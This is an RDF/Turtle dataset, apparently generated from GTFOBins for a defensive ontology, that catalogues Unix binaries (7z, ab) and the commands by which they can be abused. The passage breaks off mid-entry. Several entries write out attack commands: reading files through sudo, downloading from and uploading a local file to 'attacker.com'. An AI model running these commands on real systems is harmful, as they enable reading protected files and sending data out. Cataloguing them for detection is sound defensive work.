<https://w3id.org/mknd/data/gtfobins> a owl:Ontology ;
    dcterms:creator <https://orcid.org/0000-0001-7399-6740> ;
    dcterms:date "2023-02-11"^^xsd:date ;
    dcterms:description "Unix binaries and the commands from GTFOBins (https://gtfobins.github.io) that can be abused with them, as MKND/D3FEND individuals."@en ;
    dcterms:license <https://opensource.org/license/mit> ;
    dcterms:modified "2026-10-29"^^xsd:date ;
    dcterms:source <https://github.com/GTFOBins/GTFOBins.github.io/tree/d1d30414fe6d609059bba4794501fcd397e7d3e3> ;
    dcterms:title "GTFOBins dataset for MKND"@en ;
    rdfs:comment "Generated by scripts/data/generate.py (`make data`) from GTFOBins/GTFOBins.github.io at commit d1d30414fe6d609059bba4794501fcd397e7d3e3 (2023-02-11); dcterms:date is that commit's date. Do not edit by hand."@en ;
    owl:imports mknd: ;
    owl:versionIRI <https://w3id.org/mknd/data/gtfobins/0.5.0> ;
    owl:versionInfo "0.5.0" .

mknd:command_7z-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "7z-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_7z ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_7z ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
""" .

mknd:command_7z-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "7z-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_7z ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_7z ;
    mknd:provides mknd:function_sudo ;
    mknd:value """LFILE=file_to_read
sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so
""" .

mknd:command_ab-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ab-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length." ;
    d3f:uses mknd:executable_ab ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ab ;
    mknd:provides mknd:function_file-download ;
    mknd:value """URL=http://attacker.com/file_to_download
ab -v2 $URL
""" .

mknd:command_ab-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ab-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Upload local file via HTTP POST request." ;
    d3f:uses mknd:executable_ab ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ab ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """URL=http://attacker.com/
LFILE=file_to_send
ab -p $LFILE $URL
""" .

mknd:command_ab-sudo a d3f:Command,
